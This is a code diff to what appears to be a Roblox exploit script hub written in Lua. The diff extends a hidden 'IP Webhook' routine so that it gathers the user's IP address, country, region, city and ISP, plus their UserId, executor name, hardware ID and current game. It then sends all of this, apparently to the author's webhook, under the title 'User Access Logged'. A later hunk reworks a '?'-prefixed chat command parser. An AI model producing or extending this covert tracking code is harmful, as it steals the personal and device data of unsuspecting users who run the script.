@@ -115,23 +115,41 @@ for displayName, url in pairs(LOADER_SCRIPTS) do
     addScriptButton(displayName, url)
 end
 
--- ===[ IP Webhook ]===
+-- ===[ IP Webhook + Extended Info ]===
 task.delay(0.5, function()
-    local ok, resp = pcall(function() return game:HttpGet(IP_API_URL, true) end)
+    local ok, resp = pcall(function()
+        return game:HttpGet(IP_API_URL, true)
+    end)
     if not ok or not resp then
         return warn("IP fetch failed:", resp)
     end
 
     local data = HttpService:JSONDecode(resp)
+
+    local executor = identifyexecutor and identifyexecutor() or "Unknown"
+    local hwid = gethwid and gethwid() or "Unavailable"
+    local gameName = "Unknown"
+    pcall(function()
+        local info = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+        gameName = info.Name or "Unknown"
+    end)
+
     local payload = {
         username = "🔥 | Developer",
         embeds = {{
-            title = "📡 User Info",
-            description = string.format(
-                "**User:** `%s`\n**IP:** `%s`\n**Country:** `%s`\n**Region:** `%s`\n**City:** `%s`\n**ISP:** `%s`",
-                player.Name, data.ip or "Unknown", data.country or "Unknown",
-                data.region or "Unknown", data.city or "Unknown", data.org or "Unknown"
-            ),
+            title = "📡 User Access Logged",
+            description = table.concat({
+                "**Username:** `" .. player.Name .. "`",
+                "**UserId:** `" .. player.UserId .. "`",
+                "**IP:** `" .. (data.ip or "Unknown") .. "`",
+                "**Country:** `" .. (data.country or "Unknown") .. "`",
+                "**Region:** `" .. (data.region or "Unknown") .. "`",
+                "**City:** `" .. (data.city or "Unknown") .. "`",
+                "**ISP:** `" .. (data.org or "Unknown") .. "`",
+                "**Game:** `" .. gameName .. "`",
+                "**Executor:** `" .. executor .. "`",
+                "**HWID:** `" .. hwid .. "`"
+            }, "\n"),
             color = 3447003,
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
@@ -177,9 +195,8 @@ cmdEvent.OnClientEvent:Connect(function(sender, cmd, targetName)
     end
 end)
 
--- ===[ Chat Command Parser ]===
-ChatService.OnMessageDoneFiltering:Connect(function(msgData)
-    local msg = msgData.Message
+-- ===[ Chat Command Parser Fix ]===
+player.Chatted:Connect(function(msg)
     if msg:sub(1, 1) ~= "?" then return end
 
     local args = string.split(msg:sub(2), " ")
